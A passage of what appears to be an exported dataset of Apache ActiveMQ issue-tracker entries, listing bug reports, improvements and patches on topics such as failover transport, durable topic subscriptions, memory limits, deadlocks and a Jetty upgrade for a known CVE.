IllegalStateException("Invalid session state.");            }        }    }What will happen when no producer will send a message to this queue so that no message will pass this method? When will the deliveredMessages been acked?
issueID:AMQ-3665
type:Bug
changed files:
texts:Velocity&#39;s IntroSpectionCache causes OutOfMemoryError on large AMQ stores when running activem-admin journal-audit
activemq-admin journal-audit can be used to dump the content of the AMQ store to system out. The format of the output is rendered using Velocity.For large AMQ stores (e.g. 3GB) activemq-admin will run out of memory. This is because Velocity internally uses an introSpectionCache that fills up over time until heap memory is exhausted. There is some documentation on that cache in the Velocity Developers Guide in section "Other Context Issues":One of the features provided by the VelocityContext (or any Context derived from AbstractContext) is node specific introspection caching. Generally, you as a the developer don"t need to worry about this when using the VelocityContext as your context. However, there is currently one known usage pattern where you must be aware of this feature.The VelocityContext will accumulate intropection information about the syntax nodes in a template as it visits those nodes. So, in the following situation: You are iterating over the same template using the same VelocityContext object. Template caching is off. You request the Template from getTemplate() on each iteration.It is possible that your VelocityContext will appear to "leak" memory (it is really just gathering more introspection information.) What happens is that it accumulates template node introspection information for each template it visits, and as template caching is off, it appears to the VelocityContext that it is visiting a new template each time. Hence it gathers more introspection information and grows. It is highly recommended that you do one or more of the following: Create a new VelocityContext for each excursion down through the template render process. This will prevent the accumulation of introspection cache data. For the case where you want to reuse the VelocityContext because it"s populated with data or objects, you can simply wrap the populated VelocityContext in another, and the "outer" one will accumulate the introspection information, which you will just discard. Ex. VelocityContext useThis = new VelocityContext( populatedVC ); This works because the outer context will store the introspection cache data, and get any requested data from the inner context (as it is empty.) Be careful though - if your template places data into the context and it"s expected that it will be used in the subsequent iterations, you will need to do one of the other fixes, as any template #set() statements will be stored in the outermost context. See the discussion in Context chaining for more information. Turn on template caching. This will prevent the template from being re-parsed on each iteration, resulting the the VelocityContext being able to not only avoid adding to the introspection cache information, but be able to use it resulting in a performance improvement. Reuse the Template object for the duration of the loop iterations. Then you won"t be forcing Velocity, if the cache is turned off, to reread and reparse the same template over and over, so the VelocityContext won"t gather new introspection information each time.Right now the Velocity introSpectionCache grows with every entry read from the journal until an OOM error is raised.
issueID:AMQ-3667
type:Improvement
changed files:
texts:Use 1G heap by default and UseDedicatedTaskRunner=false, more production ready
-Xmx1G and -Xms1G is more production ready as folks tend to leave the defaults in place.-Dorg.apache.activemq.UseDedicatedTaskRunner=true made sense for small numbers of connections and for earlier versions of the broker that used fewer thread pools.With the current impl, sharing threads makes more sense by default, so -Dorg.apache.activemq.UseDedicatedTaskRunner=false (the default) is preferable.
issueID:AMQ-3669
type:Bug
changed files:
texts:Pending producer with qMirror, messages are not spooled to disk
We fill a queue that is backed by a qmirror with data (persistent) that exceeds the configured memory limit.The producer (producerFlowControl="true" at queue and qmirror) will be throttled when the the limit is reached, no messages are spooled to disk.As an overall result, we are not able to write a lot of messages into amq.Configuration:  <destinationInterceptors>  <mirroredQueue copyMessage = "true" postfix=".qmirror" prefix=""/> </destinationInterceptors> <destinationPolicy>  <policyMap>    <policyEntries>   <policyEntry topic=">" producerFlowControl="true" memoryLimit="2mb" />   <policyEntry queue="created.static.for.persistent" producerFlowControl="true" memoryLimit="1mb" />    </policyEntries>  </policyMap> </destinationPolicy>  <destinations>  <queue physicalName="created.static.for.persistent" /> </destinations> <persistenceAdapter>  <kahaDB directory="${activemq.base}/data/kahadb"/> </persistenceAdapter>  <systemUsage>  <systemUsage>   <memoryUsage><memoryUsage limit="10 mb" /></memoryUsage>   <storeUsage><storeUsage limit="100 mb"/></storeUsage>   <tempUsage><tempUsage limit="100 mb"/></tempUsage>  </systemUsage> </systemUsage>  <transportConnectors>  <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/> </transportConnectors> Java test code:     ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");    Connection connection = factory.createConnection("user", "pwd");    connection.start();    Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);    Destination destination = session.createQueue("created.static.for.persistent");    MessageProducer producer = session.createProducer(destination);    producer.setDeliveryMode(DeliveryMode.PERSISTENT);    char[] m = new char[1024];    Arrays.fill(m, "x");    // create some messages that have 1k each    for (int i = 0; i < 12000; i++) {      ActiveMQTextMessage message = new ActiveMQTextMessage();      message.setText(new String(m));      producer.send(message);    }    connection.stop();    connection.close();  } Expectation:Messages should be written to disk when the memory limit exceeds, all messages should be available within the queue/topic.Result: INFO | Usage Manager memory limit (2097152) reached for topic://created.static.for.persistent.qmirror. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more infoStore percent used  : 10 Memory percent used : 20Temp percent used   : 0Interesting: The smaller flow control for the queue (1mb) does not seem to catch but the qmirror does (2mb).
issueID:AMQ-3670
type:Bug
changed files:
texts:Fix NACK support for Stomp
Currently there"s no test for it and it seems to be buggy.
issueID:AMQ-3672
type:Bug
changed files:
texts:NPE exception when querying a starting broker use JMX program
Hi,This occurs in the latest release, SP-20. Essentially if your broker is slow starting up, e.g. you force a rebuild of the index file by deleting db.data & db.redo on a large kahadb and you try to obtain the list of queues on the broker, e.g. mbean.getQueues(), you"ll get a NPE exception:java.lang.NullPointerException at org.apache.activemq.broker.jmx.BrokerView.getQueues(BrokerView.java:189) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:93) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:27) at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:208) at com.sun.jmx.mbeanserver.PerInterface.getAttribute(PerInterface.java:65) at com.sun.jmx.mbeanserver.MBeanSupport.getAttribute(MBeanSupport.java:216) at javax.management.StandardMBean.getAttribute(StandardMBean.java:358) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666) at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1404) at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectionImpl.java:72) at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1265) at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1360) at javax.management.remote.rmi.RMIConnectionImpl.getAttribute(RMIConnectionImpl.java:600) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305) at sun.rmi.transport.Transport$1.run(Transport.java:159) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:155) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Looks like the BrokerService initially creates the BrokerView with a null ManagedRegionBroker and then later fills this in once the BrokerSerice start is completed. When the index is being recovered this process is delayed and you have the chance to get access to the BrokerView while it still doesn"t have its ManagedRegionBroker instance set. This affects a slave as well as a normal broker that requires a long time to start up the store.  The BrokerView class should be checking the broker reference to see if its not set and throw an IllegalStateException indicating that the broker is not yet started.There are also cases where a NullPointerException from the removeConnector methods that should be checked and a NoSuchElementException in those cases
issueID:AMQ-3673
type:Bug
changed files:
texts:Unexpected behavior in FailoverTransport when hosts are unknown
There"s an unexpected behavior when a failover url is specified where the first host does not exist, e.g.failover:(tcp://nonexistinghost.mydomain.com:61616,tcp://existinghost.mydomain.com:61616)?randomize=falseThe failover code will never switch to the tcp://existinghost.mydomain.com:61616 while when using this url:failover:(tcp://nonexistinghost.mydomain.com:61617,tcp://existinghost.mydomain.com:61616)?randomize=falseThe failover works flawlessly. I tracket the problem down to the method org.apache.activemq.transport.failover.FailoverTransport.contains(URI):private boolean contains(URI newURI) {        boolean result = false;        try {        for (URI uri:uris) {            if (newURI.getPort()==uri.getPort()) {                InetAddress newAddr = InetAddress.getByName(newURI.getHost());                InetAddress addr = InetAddress.getByName(uri.getHost());                if (addr.equals(newAddr)) {                    result = true;                    break;                }            }        }        }catch(IOException e) {            result = true;            LOG.error("Failed to verify URI " + newURI + " already known: " + e);        }        return result;    }That only resolves hostnames if the ports are not equal (this is why the different port behavior comes from).In above mentioned case in the second call to this method this line fails with a UnknownHostException: InetAddress addr = InetAddress.getByName(uri.getHost());and the result of contains() is set to true because of the catch block, therefore the second URL isn"t added to the list of urls.I suggest to change the catch block to return false. In case of an IOException during the check it"s hard to say whether the URIs are the same or not, but it"s more likely that they"re not the same as in this case.
issueID:AMQ-3674
type:Bug
changed files:
texts:TopicRegion removes durableScriber from durableSubscriptions when it is active; but leaves subscription on Topic
http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/TopicRegion.java?revision=1160894&view=markupVia the Web Admin Console you can attempt to remove a durable topic subscription when it is active; however you will receive the message: "Durable consumer is in use".  However, there is unfortunate side effect of this attempt in that the durableSubscriptions map is modified and the subscription is removed from the map, and the topic is left with subscription.    If you subsequentially then disconnect the active durable topic consumer (so it"s in an active state; where you and attempt to remove the subscription), you cannot remove the inactive subscription as you hit: "No durable subscription exists for:" @Override    public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception {        SubscriptionKey key = new SubscriptionKey(info.getClientId(), info.getSubscriptionName());        DurableTopicSubscription sub = durableSubscriptions.remove(key);        if (sub == null) {            throw new InvalidDestinationException("No durable subscription exists for: " + info.getSubscriptionName());        }        if (sub.isActive()) {            throw new JMSException("Durable consumer is in use");        }The above maybe should be changed to, where the subscription is get from the map, and only removed if it"s !sub.isActive().  (Or perhaps re add the subscription to the map if it is Active) @Override    public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception {        SubscriptionKey key = new SubscriptionKey(info.getClientId(), info.getSubscriptionName());        DurableTopicSubscription sub = durableSubscriptions.get(key);        if (sub == null) {            throw new InvalidDestinationException("No durable subscription exists for: " + info.getSubscriptionName());        }        if (sub.isActive()) {            throw new JMSException("Durable consumer is in use");        }        if(sub!=null) {           durableSubscriptions.remove(key);        }let me know if that makes no sense; and i"ll try to create you a sample unit test.cheers/dom
issueID:AMQ-3675
type:Bug
changed files:
texts:Removing a DurableTopicSubscription leaves subscription in active subscriptions map
Url reference: http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/TopicRegion.java?revision=1160894&view=markupWhen removing a durable topic subscription, the subscriptions map is left with the durable subscription on the map.  This means that if you were to remove the topic and then recreate the topic, you end up with a continually increasing consumerCount on the Topic.  Replication on the Web Admin console is: Create inactive durable subscriber delete the associated topic delete inactive durable subscriber Create inactive durable subscriberThe topic will now think/show it has 2 subscribers on the destinationStatistics associated with the topic.This seems to boil down to an accidental use of identity comparison on the subscriptions map in the method {{public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception }}:196  if (subscriptions.get(sub.getConsumerInfo()) != null) {197   super.removeConsumer(context, sub.getConsumerInfo());198  } else {199  // try destroying inactive subscriptions200  destroySubscription(sub);201  }which should be (i think):196  if (subscriptions.get(sub.getConsumerInfo().getConsumerId()) != null) {197   super.removeConsumer(context, sub.getConsumerInfo());198  } else {199  // try destroying inactive subscriptions200  destroySubscription(sub);201  }Subscriptions are added to the map using the getConsumerId(), not the identity of the ConsumerInfo object; elsewhere in the class; hence the suggestion for using getConsumerId()Hope that makes sense.cheers/dom
issueID:AMQ-3678
type:Bug
changed files:
texts:Active Durable Topic Consumer is not re-assigned to Topic after it is deleted and recreated
If I have a durable subscriber on a topic, which is active; and a message producer is sending to the topic. If the topic is deleted (whist the durable consumer is active), should the durable subscription be re-added to the topic (as a consumer) when it the TOPIC is subsequently recreated by the producer on the next message send? When replicating the above with a QUEUE that has an active consumer and producer.If you delete the queue whilst the producer and consumer are active, the next message sent by the producer recreates the QUEUE, and the active consumer is then registered as a consumer on the queue.  However, this isn"t the case for an active durable consumer (which isn"t re-added as a consumer); when the TOPIC is subsequently recreated by the producer"s next message to the topic.It could be the case that you should not be able to delete the topic, via jmx, whenan active durable consumer is present?  If so, then should this logic also apply to the queue? (not ableto delete it via jmx when it has an active consumer).To re-attach the active durable consumer to the newly created topic, in  http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Topic.javaYou could apply the attached patch to the {{public void addSubscription(ConnectionContext context, final Subscription sub) throws Exception }} method (line 112) to re-add the durable consumer. (junit included)A related question to the above is should the advisory  "ActiveMQ.Advisory.Consumer.Topic.XXX"  or "ActiveMQ.Advisory.Consumer.Queue.XXX"Be recreated when the active consumer reattaches to the queue or topic?When you remove, via jmx, the Queue or Topic the associated Consumer Advisory Topic is also removed.When the queue or topic is recreated, and the consumer re-assigned to the new queue; the advisory isn"tcreated/fired.  Would this cause any issues?  Should an advisory be sent?  does it affect dynamicallyIncludedDestinationsand the use of the Advisories when using a network of brokers?cheers/dom
issueID:AMQ-3679
type:Bug
changed files:
texts:Bad osgi metadata for activeio-core introduced with fix for AMQ-3461
The pom.xml for the activeio component generates invalid OSGI metadata for the optional import of the org.objectweb.howl.log package. I believe this should be changed to:<activeio.osgi.import.pkg>         org.objectweb.howl.log*;resolution:=optional,         *</activeio.osgi.import.pkg>
issueID:AMQ-3680
type:Bug
changed files:
texts:Cleanup of temporary destinations by PooledConnection and ConnectionPool either leaks temp dests or deletes too many
Creating this as follow-up on AMQ-3457.AMQ-3457 removed cleanup on call to close() for PooledConnection objects, causing temporary destinations to remain in the broker until all uses of the actual underlying ActiveMQ connection are closed.  Since those other uses of the underlying connection can be held indefinitely, or - on a very active system - there might be almost no time when there are no users of a connection, those temporary destinations essentially create a leak.The most correct operation would remove the temporary destination for each PooledConnection when it"s close() method is called.Prior to AMQ-3457, updates for AMQ-2349 attempted to resolve this problem, but ended up being overly-aggressive, removing all of the temporary destinations from the underlying connection.  So, one PooledConnection"s close() deleted temporary destinations for multiple PooledConnection objects which were still active.Test case and patch will be provided.
issueID:AMQ-3681
type:Bug
changed files:
texts:DatabaseLocker should first cancel locking SQL statement before closing the SQL connection
ActiveMQ is configured in a Master/Slave configuration with an Oracle database :http://activemq.apache.org/jdbc-master-slave.htmlhttp://servicemix.apache.org/clustering.htmlWhen the slave node is stopping, "activemq-broker" stays forever in the "Stopping" state.This is because the locking SQL statement cannot be interrupted by just closing the JDBC connection.  It is also needed to "cancel" the SQL statement.Here is a patch to DefaultDatabaseLocker which makes it compatible with Oracle.Thanks."Thread-92" prio=10 tid=0x08c4d800 nid=0x1036 waiting for monitor entry [0x8ab3a000]   java.lang.Thread.State: BLOCKED (on object monitor) at oracle.jdbc.driver.PhysicalConnection.isClosed(PhysicalConnection.java:1223) - waiting to lock <0xad4367e0> (a oracle.jdbc.driver.T4CConnection) at org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386) at org.apache.commons.dbcp.DelegatingConnection.isClosed(DelegatingConnection.java:386) at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.isClosed(PoolingDataSource.java:201) at org.apache.activemq.store.jdbc.DefaultDatabaseLocker.stop(DefaultDatabaseLocker.java:137) at com.mycompany.PoolCloser.close(PoolCloser.java:77) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.aries.blueprint.utils.ReflectionUtils.invoke(ReflectionUtils.java:221) at org.apache.aries.blueprint.container.ServiceListener.invokeMethod(ServiceListener.java:98) at org.apache.aries.blueprint.container.ServiceListener.unregister(ServiceListener.java:65)
issueID:AMQ-3682
type:Improvement
changed files:
texts:ActiveMQ Karaf commands should try using --jmxlocal by default
This should make it work out of the box on karaf child instances
issueID:AMQ-3683
type:Improvement
changed files:AbstractInactivityMonitor.java
texts:Enhance the InactivityMonitor shutdown logic
The read and write check methods in AbstractInactivityMonitor should be checking the monitorStarted value to ensure that they don"t attempt to execute unnecessary read and write check events into the ASYNC_TASKS executor.  The effect of the extra checks during shutdown doesn"t break anything but can result in a longer time to shutdown the transport and more logging for no reason.
issueID:AMQ-3684
type:Bug
changed files:VMTransport.java
texts:Potential deadlock in vm transport setListener when sender is blocked pending space
Noticed an intermittent dead lock in test:"ActiveMQ Task-1" daemon prio=5 tid=101953000 nid=0x10abf3000 in Object.wait() [10abf2000]   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on <7ddcdb9a0> (a java.lang.Object) at java.lang.Object.wait(Object.java:485) at org.apache.activemq.thread.Valve.turnOff(Valve.java:71) - locked <7ddcdb9a0> (a java.lang.Object) at org.apache.activemq.transport.vm.VMTransport.setTransportListener(VMTransport.java:230) at org.apache.activemq.transport.TransportFilter.setTransportListener(TransportFilter.java:42) at org.apache.activemq.transport.TransportFilter.setTransportListener(TransportFilter.java:42) at org.apache.activemq.broker.TransportConnection.<init>(TransportConnection.java:140) at org.apache.activemq.broker.TransportConnector.createConnection(TransportConnector.java:302) at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:218) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)"RMI RenewClean-[192.168.1.9:57412]" daemon prio=5 tid=10193d800 nid=0x10a7e7000 in Object.wait() [10a7e6000]   java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on <7dd894fe0> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:118) - locked <7dd894fe0> (a java.lang.ref.ReferenceQueue$Lock) at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:516) at java.lang.Thread.run(Thread.java:680)"main" prio=5 tid=101807000 nid=0x100501000 waiting on condition [1004fe000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <7ddcdbc98> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1987) at java.util.concurrent.LinkedBlockingQueue.put(LinkedBlockingQueue.java:306) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:100) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.StubConnection.send(StubConnection.java:107) at org.apache.activemq.store.kahadb.KahaDBStoreRecoveryBrokerTest.testLargeQueuePersistentMessagesNotLostOnRestart(KahaDBStoreRecoveryBrokerTest.java:118)...
issueID:AMQ-3685
type:Bug
changed files:
texts:Failover cluster update broken when url contains server side options
When transport connector contains some server side config options liketcp://localhost:61617?transport.closeAsync=falsefailover transport can fail as it can try connecting to that url with all its server side options.
issueID:AMQ-3693
type:Task
changed files:
texts:Upgrade Jetty to address CVE-2011-4461
Upgrade Jetty to the 7.6.0 release when it becomes final so as to address a DoS vulnerability. See the CVE-2011-4461 for more information. See also the attached patch for changes.
issueID:AMQ-3694
type:Bug
changed files:
texts:Blocked/Slow advisory consumers in duplex network connector, eventually breaks request/reply with temps
In duplex network connectors, the destinations and temp advisories are not acked. This leads to a buildup of advisory messages on the bridging broker and missing advisories on the target.In the main, when the numbers of destinations is static and there are no temp queues per roundtrip this goes unnoticed.If request/reply is used over a network with a temp queue per request (a bit of an anti pattern, they are typically per connection), the problem is quickly visible with the default prefetch. Very quickly advisories for temp queue creation and producer consumers get blocked and communication comes to a halt. The root cause is that advisories are not acked in the duplex case so we can only get 750 (.75*prefetch) of them before we block.symptomjavax.jms.JMSException: The destination temp-queue://ID:xxx-xxx-0:7:17 does not exist. or replies do not get propagated back because the consumer advisory is blocked.
issueID:AMQ-3695
type:Bug
changed files:Statements.java
texts:Failover using a JDBC Message Store and Virtual Topic can result in a lost message if queue is empty
Description:A consumer connects to the broker and expresses interest in the virtual topic and the queue is created and emptyThe consumer then disconnectsThe broker is killed and the producer fails over to the next brokerThe producer sends the message to the topicThe consumer reconnects to the broker, however it has no message waiting the virtual topic"s queueSymptomThe queue for the virtual topic is not automatically created during the failover.Work aroundA work around for this issue is to use startup destinations on the slave brokers if the destination is known.
issueID:AMQ-3696
type:Improvement
changed files:spring.xml
BrokerService.java
blueprint.xml
XBeanBrokerService.java
texts:Slave broker cannot be stopped in a JDBC Master/Slave configuration within OSGi
A Blueprint container cannot be stopped while it is in the state "Creating" because both operations are synchronized in BlueprintContainerImpl.The impact is that a slave broker cannot be stopped. Fortunately, before the broker itself is stopped, first the OSGi services are unregistered, which calls the configured OSGi unregistration listeners.This patch provides a class which is a OSGi service unregistration listener, to allow to stop the database locker, while it is blocked in the "Creating" state.
issueID:AMQ-3699
type:New Feature
changed files:
texts:Failover transport: support priority urls
In some use cases it"s important to detect that "local" broker is available and force reconnecting to it.For example if we have url likefailover:(tcp://local:61616,tcp://remote:61616)?priorityBackup=trueshould try to backup "local" transport until it"s ready and reconnect there when available.By default only the first url is considered "priority". If you want to further tune what urls are considered prioritized you can use something likefailover:(tcp://local1:61616,tcp://local2:61616,tcp://remote:61616)?priorityBackup=true&priorityURIs=tcp://local1:61616,tcp://local2:61616
issueID:AMQ-3700
type:Bug
changed files:Queue.java
texts:java.util.ConcurrentModificationException in org.apache.activemq.broker.region.Queue.iterate()
The following stack was reproduced in AMQ 5.5.1 but not the Fuse Message Broker version.Exception in thread "BrokerService[3561F026-E8F62746-2A202922-F17EADF0-7BCA8E67] Task-5053" java.util.ConcurrentModificationExceptionjvm 1    |  at java.util.LinkedHashMap$LinkedHashIterator.nextEntry(LinkedHashMap.java:373)jvm 1    |  at java.util.LinkedHashMap$ValueIterator.next(LinkedHashMap.java:388)jvm 1    |  at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1376)jvm 1    |  at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)jvm 1    |  at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)jvm 1    |  at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)jvm 1    |  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)jvm 1    |  at java.lang.Thread.run(Thread.java:662)This can happened only in the case where the optimizedDispatch mode is enabled and multiple producers are waiting for space.  When the memory usage decreases and the notifications are run from the iterate() method the method can be called recursively leading to the error as items are removed from the messagesWaitingForSpace map.
issueID:AMQ-3702
type:Improvement
changed files:
texts:Replacing pre-jdk 1.5 syntax with jdk 1.5 syntax and other minor changes
User supplied patch that replaces some legacy JDK usage with more modern JDK 1.5 which makes things a bit cleaner and easier to follow.
issueID:AMQ-3703
type:Improvement
changed files:Topic.java
texts:Replace use of class Valve with standard JDK ReentrantReadWriteLock in class Topic.java
The Topic class uses an old AMQ class Valve that is essentially a pre JDK 1.5 Read / Write lock.  The JDK RW lock is much more efficient than ours using only a single CAS operation in many cases when multiple readers need access to the lock as opposed to the Valve class that requires all threads to synchronize and possibly wait on a monitor.
issueID:AMQ-3705
type:Improvement
changed files:
texts:When a Destination is removed all the Advisory Topics for that destination should be removed also
Currently when a destination is removed the only two Destination specific advisory destination that are removed are the Consumer and Producer advisory topics, if any of the other advisories are enabled and an advisory destination created we don"t clean those up.
issueID:AMQ-3706
type:Sub-task
changed files:
texts:Dynamic Failover Randomize is Not Evenly Balanced
When using dynamic failover with randomize enabled, clients are not consistently rebalanced in an even manner.  A test case is added that allows a minimum of 25% per broker on a three broker test and 40% distribution on a 2 broker test.
issueID:AMQ-3709
type:Bug
changed files:
texts:Patch to fix invalid XHTML in web-console&#39;s 404 and 500 pages
We created a monitor that utilizes calls to the web-console to determine stuck messages.  Occasionally, requests come back 404 (because the message disappears between calls) and the monitor dies because the XHTML for that page is invalid.  This patch makes the 404 and 500 pages valid in the eyes of the w3c markup validation service.Note: I"m placing the patch here because I do not see a place to upload it on this form.  If it appears later, I will attached.Index: activemq-web-console/src/main/webapp/500.html===================================================================&#8212; activemq-web-console/src/main/webapp/500.html (revision 1242141)+++ activemq-web-console/src/main/webapp/500.html (working copy)@@ -22,8 +22,7 @@ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <!DOCTYPE html PUBLIC "//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> -<html> +<html xmlns="http://www.w3.org/1999/xhtml">  <head>      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />      <title>Apache ActiveMQ</title> @@ -67,7 +66,7 @@                     <div class="top_red_bar">                          <div id="site-breadcrumbs">                          </div>  <div id="site-quicklinks"><P>+                        <div id="site-quicklinks"><p>                              <a href="http://activemq.apache.org/support.html"                                title="Get help and support using Apache ActiveMQ">Support</a></p>                          </div> @@ -93,7 +92,7 @@                                     <div class="navigation">                                          <div class="navigation_top">                                              <div class="navigation_bottom">  <H3>Useful Links</H3>+                                                <h3>Useful Links</h3>                                                  <ul class="alternate" type="square">                                                      <li><a href="http://activemq.apache.org/"Index: activemq-web-console/src/main/webapp/404.html===================================================================&#8212; activemq-web-console/src/main/webapp/404.html (revision 1242141)+++ activemq-web-console/src/main/webapp/404.html (working copy)@@ -22,8 +22,7 @@ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <!DOCTYPE html PUBLIC "//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> -<html> +<html xmlns="http://www.w3.org/1999/xhtml">  <head>      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />      <title>Apache ActiveMQ</title> @@ -67,7 +66,7 @@                     <div class="top_red_bar">                          <div id="site-breadcrumbs">                          </div>  <div id="site-quicklinks"><P>+                        <div id="site-quicklinks"><p>                              <a href="http://activemq.apache.org/support.html"                                title="Get help and support using Apache ActiveMQ">Support</a></p>                          </div> @@ -92,7 +91,7 @@                                     <div class="navigation">                                          <div class="navigation_top">                                              <div class="navigation_bottom">  <H3>Useful Links</H3>+                                                <h3>Useful Links</h3>                                                  <ul class="alternate" type="square">                                                      <li><a href="http://activemq.apache.org/"
issueID:AMQ-3714
type:Improvement
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
ActiveMQConnection.java
texts:getScheduler():Scheduler of class org.apache.activemq.ActiveMQConnection should use lazy initialisation
This involves an extra thread, so should be created on demand by the retry or recovery logic when needed.
issueID:AMQ-3715
type:Bug
changed files:
texts:activemq-all.jar is missing the slf4j-log4j12 dependency
According to the documentation &#91;1&#93;, the activemq-all.jar should contain all required libraries.  However when running a sample project the following error occurs:java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297) at java.lang.Thread.run(Thread.java:680)Caused by: java.lang.NoClassDefFoundError: org/slf4j/impl/StaticLoggerBinder at org.slf4j.LoggerFactory.getSingleton(LoggerFactory.java:230) at org.slf4j.LoggerFactory.bind(LoggerFactory.java:121) at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:112) at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:275) at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:248) at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:261) at org.apache.activemq.ActiveMQPrefetchPolicy.<clinit>(ActiveMQPrefetchPolicy.java:38) at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:88) at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:131) at com.fusesource.example.Producer.<init>(Producer.java:25) at com.fusesource.example.DEV3783.main(DEV3783.java:47) ... 6 moreCaused by: java.lang.ClassNotFoundException: org.slf4j.impl.StaticLoggerBinder at java.net.URLClassLoader$1.run(URLClassLoader.java:202) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(URLClassLoader.java:190) at java.lang.ClassLoader.loadClass(ClassLoader.java:306) at java.lang.ClassLoader.loadClass(ClassLoader.java:247) 